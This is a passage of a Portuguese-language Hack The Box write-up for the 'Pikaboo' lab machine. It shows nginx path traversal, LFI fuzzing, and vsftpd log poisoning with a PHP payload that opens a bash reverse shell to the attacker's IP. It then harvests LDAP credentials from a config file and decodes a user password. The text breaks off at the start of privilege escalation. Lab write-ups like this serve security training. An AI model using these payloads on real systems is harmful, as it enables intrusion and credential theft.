@@ -1,0 +1,871 @@
+<p><img src="/img/htb/htb-pikaboo-logo.png" /></p>
+
+<p><br /></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Nome</th>
+      <th>Pikaboo</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>IP</td>
+      <td>10.10.10.249</td>
+    </tr>
+    <tr>
+      <td>Pontos</td>
+      <td>40</td>
+    </tr>
+    <tr>
+      <td>OS</td>
+      <td>Linux</td>
+    </tr>
+    <tr>
+      <td>Nível</td>
+      <td>Insane</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br /></p>
+
+<h2 id="recon">RECON</h2>
+
+<h3 id="nmap">Nmap</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pikaboo]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-sCV</span> <span class="nt">-Pn</span> <span class="nt">-O</span> 10.10.10.249 <span class="nt">--min-rate</span><span class="o">=</span>512
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f <span class="o">(</span>RSA<span class="o">)</span>
+|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nginx 1.14.2
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.14.2
+|_http-title: Pikaboo
+
+
+</code></pre></div></div>
+<p>O scan com nmap nos trouxe as portas 21-FTP, 22-SSH e 80-HTTP.</p>
+
+<p>Vamos começar pela porta 21.</p>
+
+<h3 id="porta-21">Porta 21</h3>
+
+<p>Podemos verificar se o serviço de FTP foi configurado com a opção de login <code class="language-plaintext highlighter-rouge">anonymous</code>.</p>
+
+<p><img src="/img/htb/htb-pikaboo-1.png" /></p>
+
+<p>Não conseguimos o acesso anonimo, vamos partir para a próxima porta.</p>
+
+<h3 id="porta-80">Porta 80</h3>
+
+<p>Antes de enumerar com o browser, precisamos adicionar o dominio <code class="language-plaintext highlighter-rouge">pikaboo.htb</code> em <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+
+<p><img src="/img/htb/htb-pikaboo-2.png" /></p>
+
+<p>Encontramos uma página inicial sem muitos links para seguir, o código fonte da página também não traz nenhuma informação relevante., Vamos enumerar os links.</p>
+
+<p><img src="/img/htb/htb-pikaboo-3.png" /></p>
+
+<p>Em <code class="language-plaintext highlighter-rouge">Pokatdex</code>, encontramos uma lista <code class="language-plaintext highlighter-rouge">"Pokémons"</code>, para ser consultada, o link de todos eles leva para a mesma página com a mensagem <code class="language-plaintext highlighter-rouge">"PokeAPI Integration - Coming soon!"</code>.</p>
+
+<p><img src="/img/htb/htb-pikaboo-4.png" /></p>
+
+<p>Em <code class="language-plaintext highlighter-rouge">Contact</code>, temos um simplfes formulário de contato sem nada aparentemente utilizável na exploração.</p>
+
+<p><img src="/img/htb/htb-pikaboo-5.png" /></p>
+
+<p>Em <code class="language-plaintext highlighter-rouge">Admin</code> temos uma tela de auteticação que nos trouxe uma informação relevante. Ao clicarmos em <code class="language-plaintext highlighter-rouge">Cancelar</code> temos a seguinte informação:</p>
+
+<p><img src="/img/htb/htb-pikaboo-6.png" /></p>
+
+<p>Vemos a resposta de <code class="language-plaintext highlighter-rouge">Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 81</code>, porém na varredura com nmap, vimmos o <code class="language-plaintext highlighter-rouge">Nginx</code> na porta <code class="language-plaintext highlighter-rouge">80</code>. O que significa que o Nginx está chamando o Apache que está rodando localmente.</p>
+
+<h3 id="exploração">Exploração</h3>
+
+<p>Após um tempo de pesquisa sobre vulnerabilidades no Nginx, que é nossa porta de entrada, encontrei este <a href="https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/">artigo</a>.</p>
+
+<p>Basicamente podemos nos aproveitar do Nginx mal configurado para obtermos <code class="language-plaintext highlighter-rouge">Path Traversal</code> ao adicionarmos <code class="language-plaintext highlighter-rouge">../</code> na URL e conseguirmos enumerar diretórios, vamos tentar.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pikaboo]
+└─<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-e</span> <span class="nt">-u</span> http://pikaboo.htb/admin../ <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-r</span>                                                                                                                                            1 ⨯
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://pikaboo.htb/admin../
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Follow Redirect:         <span class="nb">true</span>
+<span class="o">[</span>+] Expanded:                <span class="nb">true</span>
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2021/09/19 15:24:00 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+http://pikaboo.htb/admin../.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 274]
+http://pikaboo.htb/admin../.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 274]
+http://pikaboo.htb/admin../.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 274]
+http://pikaboo.htb/admin../admin                <span class="o">(</span>Status: 401<span class="o">)</span> <span class="o">[</span>Size: 456]
+http://pikaboo.htb/admin../server-status        <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 6399]
+                                                                          
+<span class="o">===============================================================</span>
+2021/09/19 15:25:36 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+<p>Aparentemente, nada importante, porém podeos observar que <code class="language-plaintext highlighter-rouge">/server-status</code> trouxe status <code class="language-plaintext highlighter-rouge">200</code>, podemos acessá-lo para enumerar.</p>
+
+<p><img src="/img/htb/htb-pikaboo-7.png" /></p>
+
+<p>Encontramos algumas requisições recentes no servido Apache, entre elas, o <code class="language-plaintext highlighter-rouge">/admin_staging</code>, vamos tentar enumerar esta página.</p>
+
+<p><img src="/img/htb/htb-pikaboo-8.png" /></p>
+
+<p>Caímos em um dashboard com algumas informações sobre o desempenho da página.</p>
+
+<p>Ao enumerar a página, descobrimos que ao clicar em qualquer link, vemos um parâmetro <code class="language-plaintext highlighter-rouge">GET</code> na url.</p>
+
+<p><img src="/img/htb/htb-pikaboo-9.png" /></p>
+
+<p>Isso nos dá uma dica de que podemos tentar <code class="language-plaintext highlighter-rouge">LFI</code> através do parâmetro, vamos tentar.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pikaboo]
+└─<span class="nv">$ </span>ffuf <span class="nt">-u</span> http://pikaboo.htb/admin../admin_staging/index.php?page<span class="o">=</span>FUZZ <span class="nt">-w</span> /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt <span class="nt">-t</span> 200 <span class="nt">-c</span> <span class="nt">-fs</span> 15349 
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 200
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 15349
+________________________________________________
+
+/var/log/lastlog        [Status: 200, Size: 307641, Words: 3272, Lines: 368]
+/var/log/vsftpd.log     [Status: 200, Size: 19803, Words: 3893, Lines: 414]
+/var/log/wtmp           [Status: 200, Size: 169717, Words: 3286, Lines: 558]
+:: Progress: [914/914] :: Job [1/1] :: 1079 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
+</span></code></pre></div></div>
+<p>A busca nos trouxe <code class="language-plaintext highlighter-rouge">/var/log/vsftpd.log</code> que é o log do <code class="language-plaintext highlighter-rouge">VSFTPd</code>, vamos acessá-lo.</p>
+
+<p><img src="/img/htb/htb-pikaboo-10.png" /></p>
+
+<p>Conseguimos acesso ao log do VSFTPd!!!</p>
+
+<p>Agora podemos utilizar a técnica de <code class="language-plaintext highlighter-rouge">Log Poisoning</code> para conseguir um <code class="language-plaintext highlighter-rouge">RCE</code> e talvez um reverse shell, e de quebra, conseguimos enumerar o user <code class="language-plaintext highlighter-rouge">pwnmeow</code>.
+Tudo o que precisamos fazer é tentar nos concectar com o FTP, no lugar do username, inserimos um payload em <code class="language-plaintext highlighter-rouge">PHP</code>, ao enviarmos uma requisição para o log, teremos a execução do payload.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pikaboo]
+└─<span class="nv">$ </span>ftp 10.10.10.249                                            
+Connected to 10.10.10.249.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.10.249:hastur<span class="o">)</span>: &lt;?php <span class="nb">exec</span><span class="o">(</span><span class="s1">'/bin/bash -c "bash -i &gt; /dev/tcp/10.10.14.111/8443 0&gt;&amp;1"'</span><span class="o">)</span><span class="p">;</span> ?&gt;
+331 Please specify the password.
+Password:
+530 Login incorrect.
+Login failed.
+ftp&gt; quit
+221 Goodbye.
+</code></pre></div></div>
+
+<p>Em password, podemos inseir qualquer coisa.</p>
+
+<p>Agora setamos um <code class="language-plaintext highlighter-rouge">netcat</code> na porta informada no payload e enviamos um curl para o endereço.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pikaboo]
+└─<span class="nv">$ </span>curl http://pikaboo.htb/admin../admin_staging/index.php?page<span class="o">=</span>/var/log/vsftpd.log
+</code></pre></div></div>
+<p><img src="/img/htb/htb-pikaboo-11.png" /></p>
+
+<p>E conseguimos nosso shell!!!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@pikaboo:/var/www/html/admin_staging<span class="nv">$ </span><span class="nb">cd</span> /home
+<span class="nb">cd</span> /home
+www-data@pikaboo:/home<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 568
+drwxr-xr-x  3 root    root      4096 May 10 10:26 <span class="nb">.</span>
+drwxr-xr-x 18 root    root      4096 Jul 27 09:32 ..
+drwxr-xr-x  2 pwnmeow pwnmeow 569344 Jul  6 20:02 pwnmeow
+www-data@pikaboo:/home<span class="nv">$ </span><span class="nb">cd </span>pwnmeow
+<span class="nb">cd </span>pwnmeow
+www-data@pikaboo:/home/pwnmeow<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 580
+drwxr-xr-x 2 pwnmeow pwnmeow  569344 Jul  6 20:02 <span class="nb">.</span>
+drwxr-xr-x 3 root    root       4096 May 10 10:26 ..
+lrwxrwxrwx 1 root    root          9 Jul  6 20:02 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 pwnmeow pwnmeow     220 May 10 10:26 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 pwnmeow pwnmeow    3526 May 10 10:26 .bashrc
+<span class="nt">-rw-r--r--</span> 1 pwnmeow pwnmeow     807 May 10 10:26 .profile
+lrwxrwxrwx 1 root    root          9 Jul  6 20:01 .python_history -&gt; /dev/null
+<span class="nt">-r--r-----</span> 1 pwnmeow www-data     33 Sep 19 19:43 user.txt
+</code></pre></div></div>
+
+<p>No diretório <code class="language-plaintext highlighter-rouge">/home</code> encontramos o usuário pwnmeow que já havimos enumerado no log do FTP, e também já podemos obter a flag <code class="language-plaintext highlighter-rouge">user.txt</code></p>
+
+<p>Durante a enumeração local, descobrimos que o servidor está rodando um <code class="language-plaintext highlighter-rouge">LDAP</code> na porta 389.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@pikaboo:/home/pwnmeow<span class="nv">$ </span>netstat <span class="nt">-plnt</span>
+netstat <span class="nt">-plnt</span>
+Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:80              0.0.0.0:<span class="k">*</span>               LISTEN      572/nginx: worker p 
+tcp        0      0 127.0.0.1:81            0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 127.0.0.1:389           0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN      572/nginx: worker p 
+tcp6       0      0 :::21                   :::<span class="k">*</span>                    LISTEN      -                   
+tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      -  
+
+</code></pre></div></div>
+<p>Ainda na enumeração local, também descobrimos alguns scripts python no diretório <code class="language-plaintext highlighter-rouge">/opt/pokeapi</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@pikaboo:/opt/pokeapi<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 104
+drwxr-xr-x 10 root root 4096 Jul  6 18:58 <span class="nb">.</span>
+drwxr-xr-x  3 root root 4096 May 20 07:17 ..
+drwxr-xr-x  2 root root 4096 May 19 12:04 .circleci
+<span class="nt">-rw-r--r--</span>  1 root root  253 Jul  6 20:17 .dockerignore
+drwxr-xr-x  9 root root 4096 May 19 12:04 .git
+drwxr-xr-x  4 root root 4096 May 19 12:04 .github
+<span class="nt">-rwxr-xr-x</span>  1 root root  135 Jul  6 20:16 .gitignore
+<span class="nt">-rw-r--r--</span>  1 root root  100 Jul  6 20:16 .gitmodules
+<span class="nt">-rw-r--r--</span>  1 root root 3224 Jul  6 20:17 CODE_OF_CONDUCT.md
+<span class="nt">-rw-r--r--</span>  1 root root 3857 Jul  6 20:17 CONTRIBUTING.md
+<span class="nt">-rwxr-xr-x</span>  1 root root  184 Jul  6 20:17 CONTRIBUTORS.txt
+<span class="nt">-rw-r--r--</span>  1 root root 1621 Jul  6 20:16 LICENSE.md
+<span class="nt">-rwxr-xr-x</span>  1 root root 3548 Jul  6 20:16 Makefile
+<span class="nt">-rwxr-xr-x</span>  1 root root 7720 Jul  6 20:17 README.md
+drwxr-xr-x  6 root root 4096 May 19 12:04 Resources
+<span class="nt">-rw-r--r--</span>  1 root root    0 Jul  6 20:16 __init__.py
+<span class="nt">-rw-r--r--</span>  1 root root  201 Jul  6 20:17 apollo.config.js
+drwxr-xr-x  3 root root 4096 Jul  6 20:16 config
+drwxr-xr-x  4 root root 4096 May 19 12:14 data
+<span class="nt">-rw-r--r--</span>  1 root root 1802 Jul  6 20:16 docker-compose.yml
+drwxr-xr-x  4 root root 4096 May 19 12:04 graphql
+<span class="nt">-rw-r--r--</span>  1 root root  113 Jul  6 20:16 gunicorn.py.ini
+<span class="nt">-rwxr-xr-x</span>  1 root root  249 Jul  6 20:16 manage.py
+drwxr-xr-x  4 root root 4096 May 27 05:46 pokemon_v2
+<span class="nt">-rw-r--r--</span>  1 root root  375 Jul  6 20:16 requirements.txt
+<span class="nt">-rw-r--r--</span>  1 root root   86 Jul  6 20:16 test-requirements.txt
+</code></pre></div></div>
+<p>Enumerando os scripts e diretórios, encontramos algunas informações em <code class="language-plaintext highlighter-rouge">config/settings.py</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span><span class="nb">cat </span>settings.py
+<span class="nb">cat </span>settings.py
+<span class="c"># Production settings</span>
+import os
+from unipath import Path
+
+PROJECT_ROOT <span class="o">=</span> Path<span class="o">(</span>__file__<span class="o">)</span>.ancestor<span class="o">(</span>2<span class="o">)</span>
+
+DEBUG <span class="o">=</span> False
+
+TEMPLATE_DEBUG <span class="o">=</span> DEBUG
+
+ADMINS <span class="o">=</span> <span class="o">((</span><span class="s2">"Paul Hallett"</span>, <span class="s2">"paulandrewhallett@gmail.com"</span><span class="o">)</span>,<span class="o">)</span>
+
+EMAIL_BACKEND <span class="o">=</span> <span class="s2">"django.core.mail.backends.console.EmailBackend"</span>
+
+MANAGERS <span class="o">=</span> ADMINS
+
+BASE_URL <span class="o">=</span> <span class="s2">"http://pokeapi.co"</span>
+
+<span class="c"># Hosts/domain names that are valid for this site; required if DEBUG is False</span>
+<span class="c"># See https://docs.djangoproject.com/en/1.5/ref/settings/#allowed-hosts</span>
+<span class="c">#ALLOWED_HOSTS = [".pokeapi.co", "localhost", "127.0.0.1"]</span>
+ALLOWED_HOSTS <span class="o">=</span> <span class="o">[</span><span class="s2">"*"</span><span class="o">]</span>
+
+TIME_ZONE <span class="o">=</span> <span class="s2">"Europe/London"</span>
+
+LANGUAGE_CODE <span class="o">=</span> <span class="s2">"en-gb"</span>
+
+SITE_ID <span class="o">=</span> 1
+
+<span class="c"># If you set this to False, Django will make some optimizations so as not</span>
+<span class="c"># to load the internationalization machinery.</span>
+USE_I18N <span class="o">=</span> True
+
+<span class="c"># If you set this to False, Django will not format dates, numbers and</span>
+<span class="c"># calendars according to the current locale.</span>
+USE_L10N <span class="o">=</span> True
+
+<span class="c"># If you set this to False, Django will not use timezone-aware datetimes.</span>
+USE_TZ <span class="o">=</span> True
+
+<span class="c"># Explicitly define test runner to avoid warning messages on test execution</span>
+TEST_RUNNER <span class="o">=</span> <span class="s2">"django.test.runner.DiscoverRunner"</span>
+
+SECRET_KEY <span class="o">=</span> <span class="s2">"4nksdock439320df*(^x2_scm-o</span><span class="nv">$*</span><span class="s2">py3e@-awu-n^hipkm%2l</span><span class="nv">$sw$&amp;</span><span class="s2">2l#"</span>
+
+MIDDLEWARE <span class="o">=</span> <span class="o">[</span>
+    <span class="s2">"corsheaders.middleware.CorsMiddleware"</span>,
+    <span class="s2">"django.middleware.common.CommonMiddleware"</span>,
+    <span class="s2">"django.contrib.sessions.middleware.SessionMiddleware"</span>,
+    <span class="s2">"django.middleware.csrf.CsrfViewMiddleware"</span>,
+    <span class="s2">"django.contrib.auth.middleware.AuthenticationMiddleware"</span>,
+    <span class="s2">"django.contrib.messages.middleware.MessageMiddleware"</span>,
+    <span class="s2">"django.middleware.clickjacking.XFrameOptionsMiddleware"</span>,
+<span class="o">]</span>
+
+ROOT_URLCONF <span class="o">=</span> <span class="s2">"config.urls"</span>
+
+WSGI_APPLICATION <span class="o">=</span> <span class="s2">"config.wsgi.application"</span>
+
+DATABASES <span class="o">=</span> <span class="o">{</span>
+    <span class="s2">"ldap"</span>: <span class="o">{</span>
+        <span class="s2">"ENGINE"</span>: <span class="s2">"ldapdb.backends.ldap"</span>,
+        <span class="s2">"NAME"</span>: <span class="s2">"ldap:///"</span>,
+        <span class="s2">"USER"</span>: <span class="s2">"cn=binduser,ou=users,dc=pikaboo,dc=htb"</span>,
+        <span class="s2">"PASSWORD"</span>: <span class="s2">"J~42%W?PFHl]g"</span>,
+    <span class="o">}</span>,
+    <span class="s2">"default"</span>: <span class="o">{</span>
+        <span class="s2">"ENGINE"</span>: <span class="s2">"django.db.backends.sqlite3"</span>,
+        <span class="s2">"NAME"</span>: <span class="s2">"/opt/pokeapi/db.sqlite3"</span>,
+    <span class="o">}</span>
+<span class="o">}</span>
+
+CACHES <span class="o">=</span> <span class="o">{</span>
+    <span class="s2">"default"</span>: <span class="o">{</span>
+        <span class="s2">"BACKEND"</span>: <span class="s2">"django_redis.cache.RedisCache"</span>,
+        <span class="s2">"LOCATION"</span>: <span class="s2">"redis://127.0.0.1:6379/1"</span>,
+        <span class="s2">"OPTIONS"</span>: <span class="o">{</span>
+            <span class="s2">"CLIENT_CLASS"</span>: <span class="s2">"django_redis.client.DefaultClient"</span>,
+        <span class="o">}</span>,
+    <span class="o">}</span>
+<span class="o">}</span>
+
+SECRET_KEY <span class="o">=</span> os.environ.get<span class="o">(</span>
+    <span class="s2">"SECRET_KEY"</span>, <span class="s2">"ubx+22!jbo(^x2_scm-o</span><span class="nv">$*</span><span class="s2">py3e@-awu-n^hipkm%2l</span><span class="nv">$sw$&amp;</span><span class="s2">2l#"</span>
+<span class="o">)</span>
+
+CUSTOM_APPS <span class="o">=</span> <span class="o">(</span>
+    <span class="s2">"tastypie"</span>,
+    <span class="s2">"pokemon_v2"</span>,
+<span class="o">)</span>
+
+INSTALLED_APPS <span class="o">=</span> <span class="o">(</span>
+    <span class="s2">"django.contrib.auth"</span>,
+    <span class="s2">"django.contrib.contenttypes"</span>,
+    <span class="s2">"django.contrib.sessions"</span>,
+    <span class="s2">"django.contrib.sites"</span>,
+    <span class="s2">"django.contrib.admin"</span>,
+    <span class="s2">"django.contrib.humanize"</span>,
+    <span class="s2">"corsheaders"</span>,
+    <span class="s2">"rest_framework"</span>,
+    <span class="s2">"cachalot"</span>,
+<span class="o">)</span> + CUSTOM_APPS
+
+
+API_LIMIT_PER_PAGE <span class="o">=</span> 1
+
+TASTYPIE_DEFAULT_FORMATS <span class="o">=</span> <span class="o">[</span><span class="s2">"json"</span><span class="o">]</span>
+
+CORS_ORIGIN_ALLOW_ALL <span class="o">=</span> True
+
+CORS_ALLOW_METHODS <span class="o">=</span> <span class="s2">"GET"</span>
+
+CORS_URLS_REGEX <span class="o">=</span> r<span class="s2">"^/api/.*$"</span>
+
+REST_FRAMEWORK <span class="o">=</span> <span class="o">{</span>
+    <span class="s2">"DEFAULT_RENDERER_CLASSES"</span>: <span class="o">(</span><span class="s2">"drf_ujson.renderers.UJSONRenderer"</span>,<span class="o">)</span>,
+    <span class="s2">"DEFAULT_PARSER_CLASSES"</span>: <span class="o">(</span><span class="s2">"drf_ujson.renderers.UJSONRenderer"</span>,<span class="o">)</span>,
+    <span class="s2">"DEFAULT_PAGINATION_CLASS"</span>: <span class="s2">"rest_framework.pagination.LimitOffsetPagination"</span>,
+    <span class="s2">"PAGE_SIZE"</span>: 20,
+    <span class="s2">"PAGINATE_BY"</span>: 20,
+<span class="o">}</span>
+</code></pre></div></div>
+<p>Encontramos as credencias do <code class="language-plaintext highlighter-rouge">LDAP</code>!!!</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">DATABASES</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"ldap"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"ENGINE"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ldapdb.backends.ldap"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"NAME"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ldap:///"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"USER"</span><span class="p">:</span><span class="w"> </span><span class="s2">"cn=binduser,ou=users,dc=pikaboo,dc=htb"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"PASSWORD"</span><span class="p">:</span><span class="w"> </span><span class="s2">"J~42%W?PFHl]g"</span><span class="p">,</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+    </span><span class="nl">"default"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"ENGINE"</span><span class="p">:</span><span class="w"> </span><span class="s2">"django.db.backends.sqlite3"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"NAME"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/opt/pokeapi/db.sqlite3"</span><span class="p">,</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Com as credenciais, podemos enumerar o LDAP com o <code class="language-plaintext highlighter-rouge">ldapsearch</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span>ldapsearch <span class="nt">-D</span> <span class="s2">"cn=binduser,ou=users,dc=pikaboo,dc=htb"</span> <span class="nt">-w</span> <span class="s2">"J~42%W?PFHl]g"</span> <span class="nt">-b</span> <span class="s2">"dc=pikaboo,dc=htb"</span> <span class="nt">-LLL</span> <span class="nt">-h</span> 127.0.0.1 <span class="nt">-p</span> 389 <span class="nt">-s</span> sub <span class="s2">"(objectClass=*)"</span>                               
+&lt;<span class="s2">" -LLL -h 127.0.0.1 -p 389 -s sub "</span><span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span><span class="k">*</span><span class="o">)</span><span class="s2">"
+dn: dc=pikaboo,dc=htb
+objectClass: domain
+dc: pikaboo
+
+dn: dc=ftp,dc=pikaboo,dc=htb
+objectClass: domain
+dc: ftp
+
+dn: ou=users,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: users
+
+dn: dc=pokeapi,dc=pikaboo,dc=htb
+objectClass: domain
+dc: pokeapi
+
+dn: ou=users,dc=ftp,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: users
+
+dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: groups
+
+dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+uid: pwnmeow
+cn: Pwn
+sn: Meow
+loginShell: /bin/bash
+uidNumber: 10000
+gidNumber: 10000
+homeDirectory: /home/pwnmeow
+userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
+
+dn: cn=binduser,ou=users,dc=pikaboo,dc=htb
+cn: binduser
+objectClass: simpleSecurityObject
+objectClass: organizationalRole
+userPassword:: Sn40MiVXP1BGSGxdZw==
+
+dn: ou=users,dc=pokeapi,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: users
+
+dn: ou=groups,dc=pokeapi,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: groups
+</span></code></pre></div></div>
+<p>Conseguimos a senha do usuário pwnmeow em <code class="language-plaintext highlighter-rouge">base64</code>, vamos decriptá-la.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pikaboo]
+└─<span class="nv">$ </span><span class="nb">echo </span><span class="nv">X0cwdFQ0X0M0dGNIXyczbV80bEwhXw</span><span class="o">==</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+_G0tT4_C4tcH_<span class="s1">'3m_4lL!_  
+</span></code></pre></div></div>
+
+<p>Conseguimos a senha do usuário, porém ela não foi aceita na conexão via <code class="language-plaintext highlighter-rouge">SSH</code>, vamos tentar o <code class="language-plaintext highlighter-rouge">FTP</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pikaboo]
+└─<span class="nv">$ </span>ftp 10.10.10.249
+Connected to 10.10.10.249.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.10.249:hastur<span class="o">)</span>: pwnmeow
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+</code></pre></div></div>
+
+<p>Conseguimos acesso ao FTP!!!</p>
+
+<p>Porém não encontramos nada de útil, além do diretório <code class="language-plaintext highlighter-rouge">versions</code> onde temos permissão de escrita, vamos continuar a enumeração local.</p>
+
+<h3 id="escalação-de-privilégios">Escalação de privilégios</h3>
+
+<p>Ao enumerar as <code class="language-plaintext highlighter-rouge">crons</code>, identificamos uma cron feita pelo <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span><span class="nb">cat</span> /etc/crontab
+<span class="nb">cat</span> /etc/crontab
